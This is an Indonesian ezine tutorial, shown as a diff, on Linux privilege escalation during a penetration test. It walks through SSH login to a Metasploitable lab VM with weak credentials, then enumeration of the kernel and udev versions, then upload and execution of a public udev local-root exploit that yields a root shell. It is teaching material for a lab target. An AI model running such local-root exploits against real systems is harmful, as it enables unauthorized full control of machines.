@@ -1,0 +1,265 @@
+ECHO MAGAZINE VOLUME XI, ISSUE XXVII, PHILE 0x05.TXT
+                               :|             ++           
+                     :~~/ .::/ :::| ,::\ >::> :| :::\ :~~/ 
+                     :::, `::\ :|:| `::/ <::< :| :|:| :::, 
+                                                                   
+
+     NewComer Series: "Pentest: Privilege escalation"
+     y3dips [at] echo [dot] or [dot] id
+
+
+
+-----| Pendahuluan
+
+Salah satu langkah dalam metodologi penetration testing yang umum
+dilakukan oleh seorang pentester adalah melakukan kegiatan privilege
+escalation, tujuan dari kegiatan ini adalah apabila pada langkah
+gaining access, pentester hanya mendapatkan user dengan low/medium
+level privilege, sehingga dengan user tersebut banyak terdapat
+keterbatasan-keterbatasan dan tidak memungkinkan untuk melakukan
+enumerasi lebih lanjut (further enumeration) baik di sistem target
+ataupun pada jaringan secara keseluruhan.  
+
+Jika pada satu kasus pentester telah mendapatkan user root saat
+kegiatan penetration testingnya, maka proses ini bisa saja tidak
+dilakukan karena sudah mendapatkan user root yang telah memiliki 
+privilege tertinggi pada sistem operasi linux, meskipun dengan 
+melakukan langkah-langkah privilege escalation akan ada data baru yang 
+mungkin berguna. 
+
+Tetapi akan berbeda apabila user yang didapatkan hanyalah user web
+aplikasi (misal: www-data), dan pada kenyataannya atau saat dilapangan,
+celah keamanan yang memungkinkan mendapatkan user root (atau
+eksploitnya biasa dikenal dengan istilah ("remote root exploit") itu
+sudah sangat langka.  Hal ini sudah jarang ditemui dikarenakan pihak
+pembuat (vendor) aplikasi dan sistem aplikasi sudah lebih aware, pihak
+user juga umumnya telah menerapkan berbagai lapisan akses ke sistem
+baik di sisi jaringan dengan penggunaan perangkat keamanan jaringan
+seperti firewall, intrusion detection/prevention system, penerapan user
+access level, dsb.  
+
+Oleh karena itu pentester umumnya harus melakukan langkah privilege
+escalation untuk mendapatkan akses user dengan high level privilege
+(root pada sistem operasi berbasis unix/linux, dan user
+system/administrator pada sistem berbasis windows).  
+
+-----| Game On
+
+Untuk melakukan privilege escalation umumnya pentester dapat
+memanfaatkan 2 cara, pertama adalah dengan memanfaatkan celah keamanan
+bukan remote terhadap sistem operasi dan aplikasi (networking dan
+non-networking) atau umumnya dikenal dengan penggunaan local root
+exploits. Yang kedua adalah dengan memanfaatkan misconfiguration, baik
+konfigurasi sistem operasi, user dan juga layanan yang berjalan.
+
+Sebelum menggunakan cara pertama atau kedua, berikut adalah langkah2
+yang umumnya dilakukan oleh seorang pentester.
+
+A.	Target behavior analysis 
+
+Untuk dapat berhasil melakukan privilege escalation, seorang pentester
+haruslah melakukan kembali analisa mendalam terhadap target, tetapi
+kali ini berbeda dengan analisa sebelumnya, karena kali ini analisa
+dilakukan dari dalam sistem dengan user yang dimiliki. Informasi yang
+dikumpulkan juga benar2 spesifik untuk mendapatkan user dengan
+privilege yang tertinggi, beberapa hal yang umumnya di analisa
+diantaranya adalah: 
+
+    a.	Versi dari sistem operasi 
+
+    Kita akan melakukan pemeriksaan lebih mendalam ke versi sistem
+    operasi, seperti versi kernel, versi distribusi (distro) yang
+    dipergunakan apabila atau merupakan sistem operasi berbasis unix
+    atau linux, kemudian memeriksa versi service pack dan language jika
+    itu windows, dan lain sebagainya yang berhubungan dengan sistem
+    operasi.
+
+    b.	Versi dari aplikasi yang terinstall (non-networking dan networking)
+
+    Pemeriksaan terhadap aplikasi yang terinstall baik yang tidak
+    membuka layanan jaringan seperti aplikasi office, ataupun yang
+    membuka layanan jaringan dan hanya di buka ke internal sistem
+    (misal mysql) ataupun internal network (dibatasi dengan firewall)
+
+    c.	User-user yang ada di target
+
+    Memeriksa file-file yang berhubungan dengan informasi user
+    (/etc/passwd), apakah terdapat user yang memiliki kemampuan di luar
+    batas yang seharusnya dia miliki, misal memiliki kemampuan menulis
+    pada irektori tertentu, menjalankan aplikasi scheduling, dsb.
+
+    d.	Aplikasi-aplikasi yang berjalan
+
+    Melakukan pemeriksaan terhadap aplikasi-aplikasi yang berjalan
+    (service/layanan), dan yang umumnya berjalan secara otomatis.
+
+-----| Proof-Of-Concept
+
+Untuk ujicoba kegiatan ini, digunakan distro Metasploitable keluaran
+metasploit/rapid7 [1]. 
+
+Sebagai contoh, pada proses scanning samba dengan .NSE pada
+metasploitable diperolehlah account user:user, dan dicoba untuk di
+gunakan ke seluruh layanan yang mengijinkan koneksi remote ke layanan
+telnet, ssh, ftp (layanan tersebut terdeteksi aktif, hasil scan dengan
+nmap).
+
+Karena itu, kita akan login via ssh remote login ke target menggunakan
+user tersebut, dan mencari informasi mengenai versi OS
+
++------------------------------------
+| Zevil:trunk zoro$ ssh user@10.0.2.12
+| The authenticity of host '10.0.2.12 (10.0.2.12)' can't be established.
+| RSA key fingerprint is 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3.
+| Are you sure you want to continue connecting (yes/no)? yes
+| Warning: Permanently added '10.0.2.12' (RSA) to the list of known hosts.
+| user@10.0.2.12's password: 
+| Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+| 
+| The programs included with the Ubuntu system are free software;
+| the exact distribution terms for each program are described in the
+| individual files in /usr/share/doc/*/copyright.
+| 
+| Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+|  applicable law.
+| 
+| To access official Ubuntu documentation, please visit:
+| http://help.ubuntu.com/
+| user@metasploitable:~$ uname -a
+| Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
++------------------------------------
+
+Selanjutnya dengan informasi versi kernel tersebut kita akan mencari
+local eksploit dari celah keamanan yang terdapat di versi kernel
+tersebut,dalam hal ini kita mempergunakan kernel 2.6 sebagai kata kunci
+untuk melakukan pencarian pada situs: http://exploit-db.com dan
+menemukan beberapa eksploit privilege escalation. 
+ 
+Umumnya celah keamanan di versi kernel tersebut berhubungan dengan
+layanan udev, sehingga kita harus memeriksa apakah versi udev
+terinstall dan berjalan di sistem milik target.  
+
++-----------------------------------
+| user@metasploitable:~$dpkg -l | grep udev
+| ii  udev      117-8      rule-based device node and kernel event mana
+|
+| user@metasploitable:~$ ps -axf  
+| Warning: bad ps syntax, perhaps a bogus '-'? See http://procps.sf.net/faq.html
+|   PID TTY      STAT   TIME COMMAND
+|    2 ?        S<     0:00 [kthreadd]
+|    3 ?        S<     0:00  \_ [migration/0]
+|    4 ?        S<     0:00  \_ [ksoftirqd/0]
+|   5 ?        S<     0:00  \_ [watchdog/0]
+|    6 ?        S<     0:00  \_ [events/0]
+---- truncated----
+|  5258 ?        S<     0:00  \_ [kjournald]
+|    1 ?        Ss     0:01 /sbin/init
+|  2963 ?        S<s    0:00 /sbin/udevd --daemon << terinstall (lebih cepat dengan ps -axf | grep udev)
+| 5163 ?        S<s    0:00 dhclient3 -e IF_METRIC=100 -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp3/dhclient.eth0.leases eth0
+| 5593 tty4     Ss+    0:00 /sbin/getty 38400 tty4
+|---- truncated ---------------------
+|
+| user@metasploitable:~$
+| user@metasploitable:~$ dpkg -s udev
+| Package: udev
+| Status: install ok installed
+| Priority: important
+| Section: admin
+| Installed-Size: 844
+| Maintainer: Scott James Remnant <scott@ubuntu.com>
+| Architecture: i386
+| Version: 117-8
+| Replaces: hotplug, ifrename, initramfs-tools (<< 0.040ubuntu1), libvolumeid0 (<< 093-0ubuntu7), volumeid
+| Conflicts: hotplug, ifrename, libdevmapper1.02 (<< 2:1.02.08-1ubuntu7), volumeid
+| Conffiles:
+| /etc/udev/rules.d/05-options.rules d8790ffa3febe1f75f4c183e4d8c770f
+| /etc/udev/rules.d/20-names.rules 9d8b53304757be000d4b61e46973b6fa
+| /etc/udev/rules.d/40-basic-permissions.rules 4a8e828ace909cafbdb1dcb23fa21f3a
++------------truncated-------------------
+
+B.	Exploitation
+
+Dan ternyata udev versi 1.17-8 terinstall di target (hasil perintah
+dpkg) dan berjalan (hasil perintah ps). Berarti pula, bahwa local root
+exploit untuk udev versi <1.41 pada kernel 2.5 akan berjalan. Exploit
+dari http://www.exploit-db.com/exploits/8478/ akan kita pergunakan
+untuk mengeksploitasi celah keamanan ini.  
+
+Sebelumnya, kita harus mengupload terlebih dahulu eksploit tersebut ke
+target, dalam hal ini kita bisa menggunakan layanan wget,ftp atau sftp.  
+
++----------------------------------------
+| Zevil:trunk zoro$ sftp user@10.0.2.12 
+| user@10.0.2.12's password: 
+| Connected to 10.0.2.12.
+| sftp> put udev.sh
+| Uploading udev.c to /home/user/udev.sh
+| udev.sh                               100% 3391     3.3KB/s   00:00    
+|sftp> exit
++-----------------------------------------
+
+Kemudian, kita jalankan local root eksploit (privilege escalation
+exploits) tersebut dengan terlebih dahulu membaca exploitnya, jangan
+sampai menggunakan exploit yang berbackdoor ;),  dan usahakan gunakan
+pre-compiled exploit ;)
+
++----------------------------------------
+| user@metasploitable:~$ head udev.sh       
+| #!/bin/sh
+| # Linux 2.6
+| # bug found by Sebastian Krahmer
+| #
+| # lame sploit using LD technique
+| # by kcope in 2009
+| # tested on debian-etch,ubuntu,gentoo
+| # do a 'cat /proc/net/netlink'
+| # and set the first arg to this
+| # script to the pid of the netlink socket
+| 
+| user@metasploitable:~$ cat /proc/net/netlink
+| sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
+| ddf35800 0   0      00000000 0        0        00000000 2
+| df4ac800 4   0      00000000 0        0        00000000 2
+| dd860e00 7   0      00000000 0        0        00000000 2
+| dd895a00 9   0      00000000 0        0        00000000 2
+| dd892a00 10  0      00000000 0        0        00000000 2
+| ddf35c00 15  0      00000000 0        0        00000000 2
+| df56f000 15  2962   00000001 0        0        00000000 2
+| dd873200 16  0      00000000 0        0        00000000 2
+| df995000 18  0      00000000 0        0        00000000 2
+| 
+| user@metasploitable:~$ bash udev.sh 2962    
+| suid.c: In function ‘main’:
+| suid.c:3: warning: incompatible implicit declaration of built-in function ‘execl’
+| /usr/bin/ld: cannot open output file /tmp/suid: Permission denied
+| collect2: ld returned 1 exit status
+| # id; whoami
+| uid=0(root) gid=0(root) groups=1001(user) 
+| root
++-----------------------------------------
+
+Dan kita pun sukses melakukan privilege escalation dan menjadi root dan
+dapat melakukan langkah selanjutnya.
+
+-----| Penutup
+
+Artikel terkait privilege-escalation kali ini membahas salah satu cara
+di sistem operasi GNU/Linux, yaitu mempergunakan "localroot exploit",
+banyak cara lain selain menggunakan exploit, bahkan terkadang anda
+tidak perlu menggunakan exploit untuk menjadi root, di sistem yang
+sudah anda miliki "limited privilege" user-nya.
+
+Pada rilis sebelumnya sudah dibahas mengenai privilege escalation di
+windows, Mudah-mudahan artikel sederhana ini dapat sedikit memberi
+gambaran untuk sistem operasi GNU/Linux.
+
+*pada rilis kali ini juga dirilis salah satu local-root exploit yang
+dapat dipergunakan untuk melakukan privilege escalation pada Distro
+Opensuse 12.2 (i686)
+
+-----| Referensi
+
+[0] Modul "Basic Pentest" -2012- y3dips 
+[1] http://information.rapid7.com/download-metasploitable.html
+
+
